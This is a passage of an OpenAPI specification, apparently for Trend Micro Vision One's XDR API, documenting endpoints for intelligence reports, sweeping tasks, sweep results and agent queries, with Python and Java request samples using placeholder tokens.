                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/intelligenceReports'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'startTime': 'YOUR_STARTTIME (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/intelligenceReports\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"startTime\", \"YOUR_STARTTIME (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/threatintel/intelligenceReports/{reportId}": {
      "get": {
        "parameters": [
          {
            "name": "reportId",
            "description": "Unique alphanumeric string that identifies a custom intelligence report",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "example": "report--2c1091ba-a7d2-46b2-bf97-4137916c30ca"
            }
          }
        ],
        "summary": "Download custom intelligence report",
        "description": "Downloads a custom intelligence report as a STIX Bundle\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Intelligence Reports</b><br>\n  <ul>\n    <li>View, filter, search</li>\n    <li>Download STIX Intelligence Reports</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Intelligence Reports"
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "data": {
                      "description": "Retrieved data",
                      "type": "object",
                      "properties": {
                        "downloadLink": {
                          "type": "string",
                          "description": "Link that you can use to download a custom intelligence report as a STIX Bundle. The link expires after five minutes.",
                          "example": "https://upload.visionone.trendmicro.com/a.txt?AWSAccessKeyId=xxxxxxxxxxxxxx..."
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/intelligenceReports/{reportId}'\nurl_path = url_path.format(**{'reportId': 'YOUR_REPORTID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/intelligenceReports/{reportId}\";\n        urlPath = urlPath.replace(\"{reportId}\", \"YOUR_REPORTID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/threatintel/intelligenceReports/{reportId}/sweepingTasks": {
      "post": {
        "summary": "Trigger sweeping task",
        "description": "Searches your environment or third-party data sources that support STIX-Shifter for threat indicators specified in a custom intelligence report\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Intelligence Reports</b><br>\n  <ul>\n    <li>VView, filter, search</li>\n    <li>Start sweeping (custom reports)</li>\n    <li>View, filter, search</li>\n    <li>Start sweeping (STIX-Shifter)</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Intelligence Reports"
        ],
        "parameters": [
          {
            "name": "reportId",
            "description": "Unique alphanumeric string that identifies a custom intelligence report",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "example": "report--2c1091ba-a7d2-46b2-bf97-4137916c30cb"
            }
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "sweepType"
                ],
                "properties": {
                  "sweepType": {
                    "type": "string",
                    "description": "Type of sweeping task. Possible values: \"manual\" and \"stixShifter\"",
                    "example": "manual"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "data": {
                      "description": "Retrieved data",
                      "type": "object",
                      "required": [
                        "taskId"
                      ],
                      "properties": {
                        "taskId": {
                          "type": "string",
                          "description": "Unique alphanumeric string that identifies a sweeping task",
                          "example": "43597ab5-b8b4-415d-87dc-24c94df82012"
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/intelligenceReports/{reportId}/sweepingTasks'\nurl_path = url_path.format(**{'reportId': 'YOUR_REPORTID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'sweepType': 'YOUR_SWEEPTYPE (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/intelligenceReports/{reportId}/sweepingTasks\";\n        urlPath = urlPath.replace(\"{reportId}\", \"YOUR_REPORTID\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"sweepType\\\": \\\"YOUR_SWEEPTYPE (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "get": {
        "parameters": [
          {
            "name": "reportId",
            "description": "Unique alphanumeric string that identifies a custom intelligence report",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "example": "report--2c1091ba-a7d2-46b2-bf97-4137916c30ca"
            }
          },
          {
            "name": "taskIdList",
            "description": "List of uniqueÂ alphanumeric strings that identify sweeping tasks. Use commas to separate values.",
            "in": "query",
            "required": false,
            "schema": {
              "type": "string",
              "example": "43597ab5-b8b4-415d-87dc-24c94df82012,52360ab5-b8b4-415d-87dc-24c94df82211"
            }
          }
        ],
        "summary": "List manual and STIX-Shifter sweeping tasks",
        "description": "Retrieves a list of sweeping tasksÂ triggered in the last 180 days that are based on custom intelligence reports\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Intelligence Reports</b><br>\n  <ul>\n    <li>View, filter, search</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Intelligence Reports"
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "data": {
                      "description": "Retrieved data",
                      "type": "array",
                      "items": {
                        "type": "object",
                        "required": [
                          "taskId",
                          "status",
                          "sweepTime",
                          "sweepType",
                          "isHit"
                        ],
                        "properties": {
                          "taskId": {
                            "type": "string",
                            "description": "Unique alphanumeric string that identifies a sweeping task",
                            "example": "43597ab5-b8b4-415d-87dc-24c94df82012"
                          },
                          "status": {
                            "type": "string",
                            "description": "Status of a sweeping task. Possible values: \"success\", \"failed\", and \"ongoing\"",
                            "example": "success"
                          },
                          "sweepTime": {
                            "type": "string",
                            "description": "Timestamp that indicates when a sweeping task was triggered",
                            "example": "2021-03-22T03:08:40Z"
                          },
                          "sweepType": {
                            "type": "string",
                            "description": "Type of sweeping task. Possible values: \"manual\" and \"stixShifter\"",
                            "example": "schedule"
                          },
                          "isHit": {
                            "type": "boolean",
                            "description": "States whether indicators were matched during a sweeping task",
                            "example": true
                          },
                          "workbenchId": {
                            "type": "string",
                            "description": "Unique alphanumeric string that identifies a Workbench alert. This property does not apply to STIX-Shifter sweeping tasks.",
                            "example": "WB-20210722-001"
                          },
                          "impactScope": {
                            "type": "array",
                            "items": {
                              "type": "object",
                              "required": [
                                "entityType",
                                "entityId"
                              ],
                              "properties": {
                                "entityType": {
                                  "type": "string",
                                  "description": "Entity type. Possible value: \"host\"",
                                  "example": "host"
                                },
                                "entityId": {
                                  "type": "string",
                                  "description": "Unique alphanumeric string that identifies an entity, such as an endpoint or agent",
                                  "example": "f2fa716e-dff6-4b98-8556-2cb780be8462"
                                }
                              }
                            }
                          },
                          "matchedIndicators": {
                            "type": "array",
                            "items": {
                              "type": "object",
                              "required": [
                                "id",
                                "pattern",
                                "highlightedObjects"
                              ],
                              "properties": {
                                "id": {
                                  "type": "string",
                                  "description": "Unique alphanumeric string that identifies a STIX Indicator",
                                  "example": "74f7eb0f-1ca3-491a-b4cf-f4d54c83c87d"
                                },
                                "pattern": {
                                  "type": "string",
                                  "description": "STIX Pattern",
                                  "example": "[network-traffic:dst_ref.type = 'domain-name' AND network-traffic:dst_ref.value = 'oauth20.xyz']"
                                },
                                "highlightedObjects": {
                                  "type": "array",
                                  "items": {
                                    "type": "object",
                                    "required": [
                                      "objectType",
                                      "objectValue",
                                      "entityIds",
                                      "firstSeen",
                                      "lastSeen"
                                    ],
                                    "properties": {
                                      "objectType": {
                                        "type": "string",
                                        "description": "Indicator type. Possible values: \"domain\", \"file_sha1\", \"file_sha256\", \"file_md5\", \"url\", \"command_line\", \"ip\", and \"user_account\"",
                                        "example": "file_sha1"
                                      },
                                      "objectValue": {
                                        "type": "string",
                                        "description": "Indicator value",
                                        "example": "b99c071333d4dbca0d9298e5c8d7480f176cafdc"
                                      },
                                      "entityIds": {
                                        "type": "array",
                                        "items": {
                                          "type": "string",
                                          "description": "Unique alphanumeric string that identifies an entity, such as an endpoint or agent",
                                          "example": "f2fa716e-dff6-4b98-8556-2cb780be8462"
                                        }
                                      },
                                      "firstSeen": {
                                        "type": "array",
                                        "items": {
                                          "type": "string",
                                          "description": "Timestamp that indicates when an indicator was first observed on an entity",
                                          "example": "2019-06-14T18:25:55.000Z"
                                        }
                                      },
                                      "lastSeen": {
                                        "type": "array",
                                        "items": {
                                          "type": "string",
                                          "description": "Timestamp that indicates when an indicator was last observed on an entity",
                                          "example": "2019-07-14T18:25:55.000Z"
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/intelligenceReports/{reportId}/sweepingTasks'\nurl_path = url_path.format(**{'reportId': 'YOUR_REPORTID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'taskIdList': 'YOUR_TASKIDLIST (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/intelligenceReports/{reportId}/sweepingTasks\";\n        urlPath = urlPath.replace(\"{reportId}\", \"YOUR_REPORTID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"taskIdList\", \"YOUR_TASKIDLIST (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/threatintel/intelligenceReports/{reportId}/sweepingTasks/{taskId}/observedData": {
      "get": {
        "parameters": [
          {
            "name": "reportId",
            "description": "Unique alphanumeric string that identifies a JSON file containing the results of a sweeping task",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "example": "report--2c1091ba-a7d2-46b2-bf97-4137916c30ca"
            }
          },
          {
            "name": "taskId",
            "description": "Unique alphanumeric string that identifies a sweeping task",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "example": "43597ab5-b8b4-415d-87dc-24c94df82012"
            }
          }
        ],
        "summary": "Download sweeping results",
        "description": "Downloads the results of a sweeping task, including matched indicators and associated entities\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Intelligence Reports</b><br>\n  <ul>\n    <li>Download results</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Intelligence Reports"
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "data": {
                      "description": "Retrieved data",
                      "type": "object",
                      "properties": {
                        "downloadLink": {
                          "type": "string",
                          "description": "Link that you can use to download the results of a sweeping task. The link expires after five minutes.",
                          "example": "https://upload.visionone.trendmicro.com/a.txt?AWSAccessKeyId=xxxxxxxxxxxxxx..."
                        }
                      }
                    }
                  }
                }
              }
            },
            "description": "OK"
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-400_Response"
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-401_Response"
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-403_Response"
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-404_Response"
                }
              }
            }
          },
          "500": {
            "description": "Internal error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/atl-500_Response"
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/threatintel/intelligenceReports/{reportId}/sweepingTasks/{taskId}/observedData'\nurl_path = url_path.format(**{'reportId': 'YOUR_REPORTID', 'taskId': 'YOUR_TASKID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/threatintel/intelligenceReports/{reportId}/sweepingTasks/{taskId}/observedData\";\n        urlPath = urlPath.replace(\"{reportId}\", \"YOUR_REPORTID\");\n        urlPath = urlPath.replace(\"{taskId}\", \"YOUR_TASKID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/eiqs/query/agentInfo": {
      "post": {
        "tags": [
          "Search"
        ],
        "summary": "Get agent information",
        "description": "Retrieves information about the specified agents.",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/spa-QueryAgentInfoRequest"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryAgentInfoResponse"
                }
              }
            }
          },
          "400": {
            "description": "Bad Request",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryAgentInfoResponse"
                },
                "examples": {
                  "ID format is not correct": {
                    "description": "ID format is not correct",
                    "value": {
                      "status": "FAIL",
                      "message": "Invalid query endpoint info request"
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized"
          },
          "404": {
            "description": "HTTP 404 Not Found"
          },
          "500": {
            "description": "Internal Server Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/spa-QueryAgentInfoResponse"
                },
                "examples": {
                  "Internal Server Error": {
                    "description": "Internal Server Error",
                    "value": {
                      "message": "Internal Server Error",
                      "status": "FAIL"
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/eiqs/query/agentInfo'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'criteria': {\n        'field': 'YOUR_FIELD (string)',\n        'value': 'YOUR_VALUE (string)'\n    }\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
